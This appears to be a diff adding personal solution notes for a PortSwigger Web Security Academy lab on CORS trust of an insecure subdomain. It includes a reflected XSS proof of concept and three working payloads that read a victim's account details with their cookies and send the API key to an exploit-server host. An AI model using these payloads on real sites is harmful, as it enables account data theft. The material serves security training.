@@ -78,3 +78,44 @@ Alternative Portswigger solution:
     };
 </script>"></iframe>
 ```
+
+## CORS vulnerability with trusted insecure protocols
+
+Check stock functionality works in `stock` subdomain. `GET /` request accept two parameters and of them is being reflected into the page without encoding, making it vulnerable to XSS. POC:
+
+```
+https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1
+```
+
+Checking `GET /accountDetails` at main domain: providing `Origin` header set to `https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net` respond with reflected `ACAO` header. Other values does not get reflected.
+
+Additionally the servers responds with `AC-With-Credentials: true`, so it makes the attack possible, because the cookies with be sent with the requests.
+
+Script that gets the cookie and sends it to the Explot Server at stock subdomain when passed as `productId`:
+
+```
+<script>
+const tmp = async () => {
+    var r = await fetch("https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails", {credentials: "include"});
+    var j = await r.json();
+    document.location = ("https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?q=" + j.apikey);
+};
+tmp();
+</script>
+```
+
+Deliver to victim and read the apikey from the Explot Server Access logs:
+
+```
+<script>
+document.location = 'https://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=3%3Cscript%3E%20const%20tmp%20=%20async%20()%20=%3E%20{%20var%20r%20=%20await%20fetch(%22https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails%22,%20{credentials:%20%22include%22});%20var%20j%20=%20await%20r.json();%20document.location%20=%20(%22https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?q=%22%20%2b%20j.apikey);%20};%20tmp();%20%3C/script%3E&storeId=1'
+</script>
+```
+
+For some reason my solution do not work. Tests in my browser were successfull, but delivering the explot to the victim did not work. Doing it like solution suggested:
+
+```
+<script>
+    document.location="http://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
